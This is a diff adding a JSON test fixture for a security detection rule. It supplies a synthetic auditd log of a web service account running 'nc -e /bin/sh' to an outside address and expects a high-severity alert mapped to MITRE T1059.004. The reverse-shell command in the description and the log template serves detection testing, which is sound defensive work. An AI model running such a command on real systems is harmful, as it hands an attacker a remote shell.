@@ -1,0 +1,30 @@
+{
+  "id": "process_linux_netcat_shell",
+  "title": "Netcat executed with -e (reverse shell pattern)",
+  "description": "auditd EXECVE shows `nc -e /bin/sh 203.0.113.50 4444` run by a web service account.",
+  "host": "lab-linux-01",
+  "kind": "positive",
+  "events": [
+    {
+      "source": "audit",
+      "template": "type=SYSCALL msg=audit(@@audit_ts@@:@@audit_serial@@): arch=c000003e syscall=59 success=yes exit=0 a0=55d6c2a1 a1=55d6c2b0 a2=55d6c2c8 a3=0 items=2 ppid=1987 pid=@@pid@@ auid=33 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=pts0 ses=4 comm=\"nc\" exe=\"/usr/bin/nc.traditional\" key=\"exec_monitor\"\ntype=EXECVE msg=audit(@@audit_ts@@:@@audit_serial@@): argc=5 a0=\"nc\" a1=\"-e\" a2=\"/bin/sh\" a3=\"203.0.113.50\" a4=\"4444\""
+    }
+  ],
+  "identity": {
+    "data.audit.command": "nc",
+    "data.audit.auid": "33"
+  },
+  "logtest": true,
+  "expect": [
+    {
+      "rule_id": "100142",
+      "level": 12,
+      "mitre": [
+        "T1059.004"
+      ],
+      "fields": {
+        "data.audit.auid": "33"
+      }
+    }
+  ]
+}
